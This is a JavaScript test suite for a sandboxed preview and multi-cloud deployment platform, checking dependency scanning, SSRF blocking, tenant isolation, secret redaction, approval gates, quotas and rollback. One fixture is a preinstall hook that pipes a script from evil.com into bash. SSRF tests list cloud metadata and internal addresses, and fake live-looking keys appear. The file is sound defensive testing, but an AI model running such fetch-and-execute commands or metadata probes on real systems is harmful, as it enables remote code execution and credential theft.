import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';

import { StorageEngine } from '../src/storage/db.js';
import { SandboxExecutor } from '../src/sandbox/sandboxExecutor.js';
import { ApprovalManager, GatedActions, ApprovalRequiredError } from '../src/approval/approvalManager.js';
import { EventBus } from '../src/core/eventBus.js';
import { PreviewManager, PREVIEW_SECURITY_HEADERS } from '../src/server/previewManager.js';
import { SSRFGuard, SSRFSecurityError, DependencyGuard } from '../src/deploy/ssrfGuard.js';
import { SecretManager, SecretScanError } from '../src/deploy/secretManager.js';
import { MockDeploymentProvider } from '../src/deploy/mockDeploymentProvider.js';
import { CloudflarePagesProvider } from '../src/deploy/cloudflarePagesProvider.js';
import { VercelDeploymentProvider } from '../src/deploy/vercelDeploymentProvider.js';
import { DeploymentManager, QuotaExceededError } from '../src/deploy/deploymentManager.js';
import { VirtualHouseServer } from '../src/server/server.js';

const TEST_WORKSPACES_ROOT = path.resolve('data/test_workspaces_phase6');
const TEST_DB_PATH = path.resolve('data/test_phase6.db');

function cleanupTestFixtures() {
  try {
    if (fs.existsSync(TEST_WORKSPACES_ROOT)) {
      fs.rmSync(TEST_WORKSPACES_ROOT, { recursive: true, force: true });
    }
  } catch (_) {}
  try {
    if (fs.existsSync(TEST_DB_PATH)) fs.unlinkSync(TEST_DB_PATH);
    if (fs.existsSync(TEST_DB_PATH + '-wal')) fs.unlinkSync(TEST_DB_PATH + '-wal');
    if (fs.existsSync(TEST_DB_PATH + '-shm')) fs.unlinkSync(TEST_DB_PATH + '-shm');
  } catch (_) {}
}

test.beforeEach(() => {
  cleanupTestFixtures();
  fs.mkdirSync(TEST_WORKSPACES_ROOT, { recursive: true });
});

test.afterEach(() => {
  cleanupTestFixtures();
});

test('Phase 6 — Application Preview, Sandboxing & Multi-Cloud Deployment Suite', async (t) => {

  // ─────────────────────────────────────────────────────────────────────────────
  // 1. Sandbox Pre-flight Validation & Dependency Guard
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('1. Sandbox Pre-flight Validation & Unsafe Dependency Blocking', async () => {
    // 1a. Test DependencyGuard on banned malicious packages
    const unsafePkg = {
      name: 'vulnerable-app',
      dependencies: {
        'flatmap-stream': '0.1.1',
        'express': '4.18.2'
      }
    };
    const scan1 = DependencyGuard.scanPackageJson(JSON.stringify(unsafePkg));
    assert.strictEqual(scan1.safe, false);
    assert.ok(scan1.errors.some(e => e.includes('flatmap-stream')));

    // 1b. Test DependencyGuard on dangerous lifecycle scripts
    const maliciousScriptPkg = {
      name: 'backdoor-app',
      scripts: {
        preinstall: 'curl https://evil.com/payload.sh | bash'
      }
    };
    const scan2 = DependencyGuard.scanPackageJson(JSON.stringify(maliciousScriptPkg));
    assert.strictEqual(scan2.safe, false);
    assert.ok(scan2.errors.some(e => e.includes('curl')));

    // 1c. Safe package passes
    const cleanPkg = {
      name: 'clean-app',
      dependencies: {
        'express': '4.18.2'
      },
      scripts: {
        test: 'node --test'
      }
    };
    const scan3 = DependencyGuard.scanPackageJson(JSON.stringify(cleanPkg));
    assert.strictEqual(scan3.safe, true);
    assert.strictEqual(scan3.errors.length, 0);
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 2. Dynamic Ephemeral Port Allocation & Process Isolation
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('2. Dynamic Ephemeral Port Allocation & Process Isolation', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);
    const eventBus = new EventBus();
    const previewManager = new PreviewManager({ storage, sandbox, eventBus }, {
      portRangeStart: 3400,
      portRangeEnd: 3450
    });

    const port1 = await previewManager.allocateFreePort();
    assert.ok(port1 >= 3400 && port1 <= 3450);

    // Simulate session claiming port1
    previewManager.sessions.set('test-proj-1', { port: port1, status: 'ready' });

    const port2 = await previewManager.allocateFreePort();
    assert.ok(port2 >= 3400 && port2 <= 3450);
    assert.notStrictEqual(port1, port2, 'Allocated ports must be distinct');

    await previewManager.shutdownAll();
    storage.close();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 3. SSRF & Cloud Metadata Endpoint Shielding
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('3. SSRF & Cloud Metadata Endpoint Shielding', async () => {
    // 3a. AWS / Azure / GCP Link-Local Metadata (169.254.169.254)
    await assert.rejects(
      async () => {
        await SSRFGuard.validateUrl('http://169.254.169.254/latest/meta-data/');
      },
      (err) => {
        assert.ok(err instanceof SSRFSecurityError);
        assert.ok(err.message.includes('restricted IP address'));
        return true;
      }
    );

    // 3b. AWS ECS Metadata (169.254.170.2)
    await assert.rejects(
      async () => {
        await SSRFGuard.validateUrl('http://169.254.170.2/v2/metadata');
      },
      (err) => {
        assert.ok(err instanceof SSRFSecurityError);
        return true;
      }
    );

    // 3c. GCP Metadata Hostname
    await assert.rejects(
      async () => {
        await SSRFGuard.validateUrl('http://metadata.google.internal/computeMetadata/v1/');
      },
      (err) => {
        assert.ok(err instanceof SSRFSecurityError);
        assert.ok(err.message.includes('internal/metadata host'));
        return true;
      }
    );

    // 3d. Private Class A RFC 1918 (10.0.0.1)
    await assert.rejects(
      async () => {
        await SSRFGuard.validateUrl('http://10.200.1.5:8080/internal-api');
      },
      (err) => {
        assert.ok(err instanceof SSRFSecurityError);
        return true;
      }
    );

    // 3e. Restricted Internal Infrastructure Port (Redis 6379, Postgres 5432)
    await assert.rejects(
      async () => {
        await SSRFGuard.validateUrl('http://93.184.216.34:6379/');
      },
      (err) => {
        assert.ok(err instanceof SSRFSecurityError);
        assert.ok(err.message.includes('restricted internal port 6379'));
        return true;
      }
    );

    // 3f. Public URL validation succeeds (skipDns for offline unit test)
    const valid = await SSRFGuard.validateUrl('https://api.cloudflare.com/client/v4/accounts', { skipDns: true });
    assert.strictEqual(valid.safe, true);
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 4. Tenant Boundary Protection on Previews & Status
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('4. Tenant Boundary Protection on Previews & Status', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);
    const eventBus = new EventBus();
    const previewManager = new PreviewManager({ storage, sandbox, eventBus });

    storage.createTenant({ id: 'tenant-alpha', name: 'Tenant Alpha', slug: 'alpha', plan: 'pro' });
    storage.createTenant({ id: 'tenant-beta', name: 'Tenant Beta', slug: 'beta', plan: 'pro' });

    const projAlpha = storage.createProject({
      id: 'proj-alpha-001',
      tenantId: 'tenant-alpha',
      name: 'Alpha Confidential App',
      description: 'Internal project'
    });

    sandbox.getProjectWorkspace('proj-alpha-001');
    sandbox.writeFileSafely('proj-alpha-001', 'public/index.html', '<h1>Alpha Dashboard</h1>');

    // Tenant Beta tries to access Tenant Alpha's preview
    const mockRes = {
      writeHead(code, headers) { this.statusCode = code; this.headers = headers; },
      end(body) { this.body = body; }
    };
    const mockReq = {
      tenantId: 'tenant-beta',
      headers: {}
    };

    await previewManager.handlePreviewRequest(mockReq, mockRes, 'proj-alpha-001', '', 'tenant-beta');
    assert.strictEqual(mockRes.statusCode, 403);
    const parsed = JSON.parse(mockRes.body);
    assert.ok(parsed.error.includes('Forbidden: Tenant "tenant-beta" is not authorized'));

    await previewManager.shutdownAll();
    storage.close();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 5. Preview Status, Logs, Security Headers & Cleanup Controls
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('5. Preview Status, Logs, Security Headers & Cleanup Controls', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);
    const eventBus = new EventBus();
    const previewManager = new PreviewManager({ storage, sandbox, eventBus });

    const proj = storage.createProject({
      id: 'proj-preview-lifecycle',
      name: 'Preview Lifecycle App',
      description: 'Testing lifecycle'
    });

    sandbox.getProjectWorkspace(proj.id);
    sandbox.writeFileSafely(proj.id, 'public/index.html', '<!DOCTYPE html><html><body><h1>Hello Sandbox</h1></body></html>');

    // 5a. Start preview session
    const session = await previewManager.startSession(proj.id);
    assert.strictEqual(session.status, 'ready');
    assert.strictEqual(session.buildState, 'success');
    assert.ok(session.logs.length > 0);

    // 5b. Request static file and verify PREVIEW_SECURITY_HEADERS
    const mockRes = {
      writeHead(code, headers) { this.statusCode = code; this.headers = headers; },
      end(body) { this.body = body; }
    };
    const mockReq = { headers: {} };

    await previewManager.handlePreviewRequest(mockReq, mockRes, proj.id, '');
    assert.strictEqual(mockRes.statusCode, 200);
    assert.ok(mockRes.headers['Content-Security-Policy'].includes('sandbox allow-scripts'));
    assert.strictEqual(mockRes.headers['X-Content-Type-Options'], 'nosniff');
    assert.strictEqual(mockRes.headers['X-Frame-Options'], 'SAMEORIGIN');
    assert.ok(mockRes.body.includes('__SYNAPSE_LIVE_PREVIEW_BRIDGE__'));

    // 5c. Cleanup session
    const cleanupResult = await previewManager.cleanupSession(proj.id);
    assert.strictEqual(cleanupResult.success, true);
    assert.strictEqual(previewManager.sessions.has(proj.id), false);

    storage.close();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 6. Provider Abstraction & Least-Privilege Credential Checklist
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('6. Provider Abstraction & Least-Privilege Credential Checklist', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);
    const approvalManager = new ApprovalManager(storage);
    const eventBus = new EventBus();

    const deploymentManager = new DeploymentManager({
      storage,
      sandbox,
      approvalManager,
      eventBus
    });

    const providers = deploymentManager.listProviders();
    assert.ok(providers.length >= 3);
    const names = providers.map(p => p.name);
    assert.ok(names.includes('mock'));
    assert.ok(names.includes('cloudflare-pages'));
    assert.ok(names.includes('vercel'));

    // Check Cloudflare Pages setup checklist
    const cfChecklist = deploymentManager.getSetupChecklist('cloudflare-pages');
    assert.strictEqual(cfChecklist.provider, 'cloudflare-pages');
    assert.ok(cfChecklist.requiredEnvVars.some(v => v.key === 'CLOUDFLARE_API_TOKEN'));
    assert.ok(cfChecklist.requiredEnvVars.some(v => v.permissions.includes('Least Privilege')));

    // Check Vercel setup checklist
    const vercelChecklist = deploymentManager.getSetupChecklist('vercel');
    assert.strictEqual(vercelChecklist.provider, 'vercel');
    assert.ok(vercelChecklist.requiredEnvVars.some(v => v.key === 'VERCEL_TOKEN'));

    storage.close();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 7. Explicit User Confirmation Gate (Gated Actions for Production Deployment)
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('7. Explicit User Confirmation Gate (Gated Actions for Production Deployment)', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);
    const approvalManager = new ApprovalManager(storage);
    const eventBus = new EventBus();

    const deploymentManager = new DeploymentManager({
      storage,
      sandbox,
      approvalManager,
      eventBus
    });

    const proj = storage.createProject({
      id: 'proj-prod-gate',
      name: 'Mission Critical FinTech',
      description: 'Requires explicit human authorization'
    });
    sandbox.getProjectWorkspace(proj.id);
    sandbox.writeFileSafely(proj.id, 'index.html', '<h1>FinTech Core</h1>');

    // 7a. Attempt to deploy to production without approval -> Must reject with ApprovalRequiredError
    let approvalId = null;
    let deploymentId = null;
    await assert.rejects(
      async () => {
        await deploymentManager.deployProject({
          projectId: proj.id,
          environment: 'production',
          providerName: 'mock'
        });
      },
      (err) => {
        assert.ok(err instanceof ApprovalRequiredError);
        assert.ok(err.details.approvalId);
        approvalId = err.details.approvalId;
        deploymentId = err.details.deploymentId;
        return true;
      }
    );

    // Verify initial deployment record was marked PENDING_APPROVAL
    const pendingDep = storage.getDeployment(deploymentId);
    assert.strictEqual(pendingDep.status, 'PENDING_APPROVAL');

    // 7b. Operator rejects the request
    approvalManager.resolveApproval(approvalId, {
      decision: 'REJECT',
      operatorId: 'sec-lead@pulse.corp',
      notes: 'Code audit required prior to production release'
    });

    await assert.rejects(
      async () => {
        await deploymentManager.deployProject({
          projectId: proj.id,
          environment: 'production',
          approvalId,
          providerName: 'mock'
        });
      },
      (err) => {
        assert.ok(err.message.includes('is in status "REJECTED"'));
        return true;
      }
    );

    // 7c. New approval request created and APPROVED
    const secondApproval = approvalManager.requestApproval({
      projectId: proj.id,
      actionType: GatedActions.PRODUCTION_DEPLOYMENT,
      riskLevel: 'HIGH',
      reason: 'Re-audit passed'
    });
    approvalManager.resolveApproval(secondApproval.id, {
      decision: 'APPROVE',
      operatorId: 'vp-eng@pulse.corp',
      notes: 'Approved for production'
    });

    // 7d. Deploy with valid approval succeeds
    const successfulDeployment = await deploymentManager.deployProject({
      projectId: proj.id,
      environment: 'production',
      approvalId: secondApproval.id,
      operatorId: 'vp-eng@pulse.corp',
      providerName: 'mock'
    });

    assert.strictEqual(successfulDeployment.status, 'DEPLOYED');
    assert.ok(successfulDeployment.target_url.includes('pulse-deploy.net'));
    assert.strictEqual(successfulDeployment.approved_by, 'vp-eng@pulse.corp');

    storage.close();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 8. Environment Variable Partitioning & Frontend Secret Redaction
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('8. Environment Variable Partitioning & Frontend Secret Redaction', async () => {
    // 8a. Test SecretManager.partitionEnvVars
    const mixedEnv = {
      VITE_PUBLIC_API_URL: 'https://api.pulse.dev',
      NEXT_PUBLIC_GA_ID: 'G-12345678',
      PUBLIC_APP_NAME: 'Pulse Cloud App',
      DATABASE_URL: 'postgres://admin:super_secret_pw@db.pulse.internal:5432/core',
      STRIPE_SECRET_KEY: 'sk_live_99887766554433221100aa',
      AWS_SECRET_ACCESS_KEY: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
    };

    const { clientSafe, serverSecrets } = SecretManager.partitionEnvVars(mixedEnv);
    assert.deepStrictEqual(Object.keys(clientSafe), ['VITE_PUBLIC_API_URL', 'NEXT_PUBLIC_GA_ID', 'PUBLIC_APP_NAME']);
    assert.deepStrictEqual(Object.keys(serverSecrets), ['DATABASE_URL', 'STRIPE_SECRET_KEY', 'AWS_SECRET_ACCESS_KEY']);

    // 8b. Test SecretManager scanning frontend directory for leaked server secrets
    const testDir = path.join(TEST_WORKSPACES_ROOT, 'leak-test');
    fs.mkdirSync(path.join(testDir, 'public'), { recursive: true });

    // Leak the Stripe secret into a client bundle file
    fs.writeFileSync(
      path.join(testDir, 'public/bundle.js'),
      `const stripeKey = "sk_live_99887766554433221100aa"; console.log("Init stripe");`
    );

    const scan = SecretManager.scanDirectoryForSecrets(testDir, serverSecrets);
    assert.strictEqual(scan.safe, false);
    assert.ok(scan.findings.some(f => f.secretKey === 'STRIPE_SECRET_KEY'));

    // Assert safety throws error
    assert.throws(
      () => SecretManager.assertFrontendSafety(testDir, serverSecrets),
      SecretScanError
    );

    // Clean up leak and ensure it passes
    fs.writeFileSync(path.join(testDir, 'public/bundle.js'), `console.log("Safe client bundle");`);
    assert.doesNotThrow(() => SecretManager.assertFrontendSafety(testDir, serverSecrets));
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 9. End-to-End Deployment Lifecycle & Status Tracking
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('9. End-to-End Deployment Lifecycle & Status Tracking', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);
    const approvalManager = new ApprovalManager(storage);
    const eventBus = new EventBus();

    const deploymentManager = new DeploymentManager({
      storage,
      sandbox,
      approvalManager,
      eventBus
    });

    const proj = storage.createProject({
      id: 'proj-e2e-deploy',
      name: 'E2E Preview App',
      description: 'Validating end to end release'
    });
    sandbox.getProjectWorkspace(proj.id);
    sandbox.writeFileSafely(proj.id, 'index.html', '<h1>Hello Production</h1>');

    const deployment = await deploymentManager.deployProject({
      projectId: proj.id,
      environment: 'preview',
      providerName: 'mock',
      commitSha: 'a1b2c3d4'
    });

    assert.strictEqual(deployment.status, 'DEPLOYED');
    assert.ok(deployment.target_url.includes('pulse-deploy.net'));
    assert.strictEqual(deployment.commit_sha, 'a1b2c3d4');
    assert.ok(deployment.build_logs.includes('[Success] Verified healthy release'));

    // Query deployment list
    const list = storage.listDeployments(proj.id);
    assert.strictEqual(list.length, 1);
    assert.strictEqual(list[0].id, deployment.id);

    storage.close();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 10. Rollback to Known Good Deployment
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('10. Rollback to Known Good Deployment', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);
    const approvalManager = new ApprovalManager(storage);
    const eventBus = new EventBus();

    const deploymentManager = new DeploymentManager({
      storage,
      sandbox,
      approvalManager,
      eventBus
    });

    const proj = storage.createProject({
      id: 'proj-rollback-test',
      name: 'Rollback Candidate App'
    });
    sandbox.getProjectWorkspace(proj.id);

    // Deploy release v1 (good)
    const depV1 = await deploymentManager.deployProject({
      projectId: proj.id,
      environment: 'preview',
      commitSha: 'commit-v1-stable'
    });

    // Deploy release v2 (buggy)
    const depV2 = await deploymentManager.deployProject({
      projectId: proj.id,
      environment: 'preview',
      commitSha: 'commit-v2-buggy'
    });

    assert.strictEqual(depV1.commit_sha, 'commit-v1-stable');
    assert.strictEqual(depV2.commit_sha, 'commit-v2-buggy');

    // Trigger Rollback from v2 back to v1
    const rollbackRecord = await deploymentManager.rollbackDeployment(depV2.id, depV1.id);

    assert.strictEqual(rollbackRecord.status, 'DEPLOYED');
    assert.strictEqual(rollbackRecord.rollback_target_id, depV1.id);
    assert.strictEqual(rollbackRecord.commit_sha, 'commit-v1-stable');

    // Verify v2 is marked ROLLED_BACK
    const updatedV2 = storage.getDeployment(depV2.id);
    assert.strictEqual(updatedV2.status, 'ROLLED_BACK');

    storage.close();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 11. Daily Deployment Quota & Rate Limit Enforcement
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('11. Daily Deployment Quota & Rate Limit Enforcement', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);
    const approvalManager = new ApprovalManager(storage);
    const eventBus = new EventBus();

    storage.createTenant({
      id: 'tenant-free-tier',
      name: 'Free Tier User',
      slug: 'free-user',
      plan: 'free' // Limit is 5 deployments/day
    });

    const proj = storage.createProject({
      id: 'proj-quota-test',
      tenantId: 'tenant-free-tier',
      name: 'Quota App'
    });
    sandbox.getProjectWorkspace(proj.id);

    const deploymentManager = new DeploymentManager({
      storage,
      sandbox,
      approvalManager,
      eventBus
    });

    // Deploy 5 times (should all succeed)
    for (let i = 0; i < 5; i++) {
      await deploymentManager.deployProject({
        projectId: proj.id,
        tenantId: 'tenant-free-tier',
        environment: 'preview',
        commitSha: `commit-${i}`
      });
    }

    // 6th deployment must be blocked by quota limit
    await assert.rejects(
      async () => {
        await deploymentManager.deployProject({
          projectId: proj.id,
          tenantId: 'tenant-free-tier',
          environment: 'preview',
          commitSha: 'commit-exceed'
        });
      },
      (err) => {
        assert.ok(err instanceof QuotaExceededError);
        assert.ok(err.message.includes('Deployment quota exceeded for tenant plan "free"'));
        return true;
      }
    );

    storage.close();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 12. Provider Error Handling & Teardown Cleanup
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('12. Provider Error Handling & Teardown Cleanup', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);
    const approvalManager = new ApprovalManager(storage);
    const eventBus = new EventBus();

    // 12a. Test provider failure simulation
    const failingProvider = new MockDeploymentProvider({
      simulateBuildFailure: true
    });
    const deploymentManager = new DeploymentManager({
      storage,
      sandbox,
      approvalManager,
      eventBus
    });
    deploymentManager.registerProvider(failingProvider);

    const proj = storage.createProject({
      id: 'proj-fail-test',
      name: 'Build Fail App'
    });
    sandbox.getProjectWorkspace(proj.id);

    await assert.rejects(
      async () => {
        await deploymentManager.deployProject({
          projectId: proj.id,
          providerName: 'mock'
        });
      },
      (err) => {
        assert.ok(err.message.includes('Simulated build failure'));
        return true;
      }
    );

    // Verify DB recorded status as FAILED
    const deployments = storage.listDeployments(proj.id);
    assert.strictEqual(deployments[0].status, 'FAILED');
    assert.ok(deployments[0].error_message.includes('Simulated build failure'));

    // 12b. Test deployment teardown
    const normalProvider = new MockDeploymentProvider();
    deploymentManager.registerProvider(normalProvider);

    const successfulDep = await deploymentManager.deployProject({
      projectId: proj.id,
      providerName: 'mock'
    });
    assert.strictEqual(successfulDep.status, 'DEPLOYED');

    // Call teardown
    const tornDown = await deploymentManager.teardownDeployment(successfulDep.id);
    assert.strictEqual(tornDown.status, 'TERMINATED');
    assert.ok(tornDown.build_logs.includes('[Teardown] Deployment resources terminated'));

    storage.close();
  });

  // ─────────────────────────────────────────────────────────────────────────────
  // 13. HTTP Server Endpoints: Preview Controls, Deployments, Approvals & Rollback
  // ─────────────────────────────────────────────────────────────────────────────
  await t.test('13. HTTP Server Endpoints: Preview Controls, Deployments, Approvals & Rollback', async () => {
    const storage = new StorageEngine(TEST_DB_PATH);
    const sandbox = new SandboxExecutor(TEST_WORKSPACES_ROOT, storage);

    storage.createTenant({ id: 'tenant-http-alpha', name: 'Alpha Corp', slug: 'alpha', plan: 'enterprise' });
    storage.createTenant({ id: 'tenant-http-beta', name: 'Beta Corp', slug: 'beta', plan: 'enterprise' });

    const server = new VirtualHouseServer({
      port: 0,
      host: '127.0.0.1',
      storage,
      sandbox,
      authEnabled: false,
      autoRun: false,
      asyncEnabled: false
    });

    await server.start();
    const port = server.server.address().port;
    const baseUrl = `http://127.0.0.1:${port}`;

    try {
      // 1. Create a project
      const projRes = await fetch(`${baseUrl}/api/projects`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Tenant-Id': 'tenant-http-alpha'
        },
        body: JSON.stringify({
          name: 'HTTP Preview App',
          description: 'Testing HTTP endpoints',
          autoRun: false
        })
      });
      assert.strictEqual(projRes.status, 201);
      const projData = await projRes.json();
      const projectId = projData.id || projData.project?.id;

      // Seed an index.html into the workspace
      sandbox.writeFileSafely(projectId, 'public/index.html', '<h1>Live from HTTP Preview</h1>');

      // 2. Query Deploy Providers & Checklist
      const provRes = await fetch(`${baseUrl}/api/deploy/providers`);
      assert.strictEqual(provRes.status, 200);
      const provData = await provRes.json();
      assert.ok(provData.providers.some(p => p.name === 'cloudflare-pages'));

      const clRes = await fetch(`${baseUrl}/api/deploy/checklist/cloudflare-pages`);
      assert.strictEqual(clRes.status, 200);
      const clData = await clRes.json();
      assert.strictEqual(clData.provider, 'cloudflare-pages');

      // 3. Preview Start, Status, and Proxy delivery
      const startPrevRes = await fetch(`${baseUrl}/api/projects/${projectId}/preview/start`, {
        method: 'POST',
        headers: { 'X-Tenant-Id': 'tenant-http-alpha' }
      });
      assert.strictEqual(startPrevRes.status, 200);
      const startPrevData = await startPrevRes.json();
      assert.strictEqual(startPrevData.status, 'ready');

      const statusRes = await fetch(`${baseUrl}/api/projects/${projectId}/preview/status`, {
        headers: { 'X-Tenant-Id': 'tenant-http-alpha' }
      });
      assert.strictEqual(statusRes.status, 200);
      const statusData = await statusRes.json();
      assert.strictEqual(statusData.status, 'ready');

      // 4. Preview HTML fetch verifies CSP headers & injected bridge
      const htmlRes = await fetch(`${baseUrl}/api/projects/${projectId}/preview/`, {
        headers: { 'X-Tenant-Id': 'tenant-http-alpha' }
      });
      assert.strictEqual(htmlRes.status, 200);
      assert.ok(htmlRes.headers.get('content-security-policy').includes('sandbox allow-scripts'));
      const htmlBody = await htmlRes.text();
      assert.ok(htmlBody.includes('Live from HTTP Preview'));
      assert.ok(htmlBody.includes('__SYNAPSE_LIVE_PREVIEW_BRIDGE__'));

      // 5. Unauthorized tenant access to preview is blocked (403)
      const unauthPrev = await fetch(`${baseUrl}/api/projects/${projectId}/preview/status`, {
        headers: { 'X-Tenant-Id': 'tenant-http-beta' }
      });
      assert.strictEqual(unauthPrev.status, 403);

      // 6. Preview stop & cleanup
      const stopRes = await fetch(`${baseUrl}/api/projects/${projectId}/preview/stop`, {
        method: 'POST',
        headers: { 'X-Tenant-Id': 'tenant-http-alpha' }
      });
      assert.strictEqual(stopRes.status, 200);

      const cleanupRes = await fetch(`${baseUrl}/api/projects/${projectId}/preview/cleanup`, {
        method: 'POST',
        headers: { 'X-Tenant-Id': 'tenant-http-alpha' }
      });
      assert.strictEqual(cleanupRes.status, 200);

      // 7. Trigger Production Deploy without approval -> Expect HTTP 403 with approvalRequired: true
      const deployReq1 = await fetch(`${baseUrl}/api/projects/${projectId}/deploy`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Tenant-Id': 'tenant-http-alpha'
        },
        body: JSON.stringify({
          environment: 'production',
          provider: 'mock'
        })
      });
      assert.strictEqual(deployReq1.status, 403);
      const deployData1 = await deployReq1.json();
      assert.strictEqual(deployData1.approvalRequired, true);
      const reqApprovalId = deployData1.details.approvalId;
      assert.ok(reqApprovalId);

      // 8. Human operator approves release via /api/approvals/:id/resolve
      const resolveRes = await fetch(`${baseUrl}/api/approvals/${reqApprovalId}/resolve`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          decision: 'APPROVE',
          operatorId: 'lead-operator@pulse.dev',
          notes: 'Production release signed off'
        })
      });
      assert.strictEqual(resolveRes.status, 200);

      // 9. Re-dispatch deployment with approvalId -> Succeeds (HTTP 200)
      const deployReq2 = await fetch(`${baseUrl}/api/projects/${projectId}/deploy`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Tenant-Id': 'tenant-http-alpha'
        },
        body: JSON.stringify({
          environment: 'production',
          provider: 'mock',
          approvalId: reqApprovalId,
          commitSha: 'commit-http-prod-v1'
        })
      });
      assert.strictEqual(deployReq2.status, 200);
      const deployData2 = await deployReq2.json();
      assert.strictEqual(deployData2.status, 'DEPLOYED');
      assert.ok(deployData2.target_url.includes('pulse-deploy.net'));
      const activeDeploymentId = deployData2.id;

      // 10. List deployments for project
      const listDepRes = await fetch(`${baseUrl}/api/projects/${projectId}/deployments`, {
        headers: { 'X-Tenant-Id': 'tenant-http-alpha' }
      });
      assert.strictEqual(listDepRes.status, 200);
      const listDepData = await listDepRes.json();
      assert.ok(listDepData.length >= 1);

      // 11. Deploy release v2 then test rollback via HTTP
      const deployV2Res = await fetch(`${baseUrl}/api/projects/${projectId}/deploy`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Tenant-Id': 'tenant-http-alpha'
        },
        body: JSON.stringify({
          environment: 'preview',
          provider: 'mock',
          commitSha: 'commit-http-preview-v2'
        })
      });
      assert.strictEqual(deployV2Res.status, 200);
      const deployV2 = await deployV2Res.json();

      const rollbackRes = await fetch(`${baseUrl}/api/projects/${projectId}/deployments/${deployV2.id}/rollback`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Tenant-Id': 'tenant-http-alpha'
        },
        body: JSON.stringify({
          targetDeploymentId: activeDeploymentId
        })
      });
      assert.strictEqual(rollbackRes.status, 200);
      const rollbackData = await rollbackRes.json();
      assert.strictEqual(rollbackData.status, 'DEPLOYED');
      assert.strictEqual(rollbackData.rollback_target_id, activeDeploymentId);

      // 12. Teardown deployment via HTTP DELETE
      const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}/deployments/${activeDeploymentId}`, {
        method: 'DELETE',
        headers: { 'X-Tenant-Id': 'tenant-http-alpha' }
      });
      assert.strictEqual(deleteRes.status, 200);
      const deleteData = await deleteRes.json();
      assert.strictEqual(deleteData.status, 'TERMINATED');

    } finally {
      await server.stop();
    }
  });

});
